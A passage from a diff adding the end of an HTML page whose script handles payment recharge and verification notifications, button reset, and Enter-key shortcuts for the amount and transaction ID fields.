+                        showNotification(rechargeResult.message || 'Recharge failed', true);
+                    }
+                } catch (error) {
+                    showNotification('Verification failed. Please try again.', true);
+                } finally {
+                    // Reset button
+                    btn.innerHTML = originalText;
+                    btn.disabled = false;
+                }
+            });
+            
+            // Enter key support
+            document.getElementById('amountInput').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('rechargeBtn').click();
+                }
+            });
+            
+            document.getElementById('transactionId').addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    document.getElementById('verifyPayment').click();
+                }
+            });
+        });
+    </script>
+</body>
+</html>
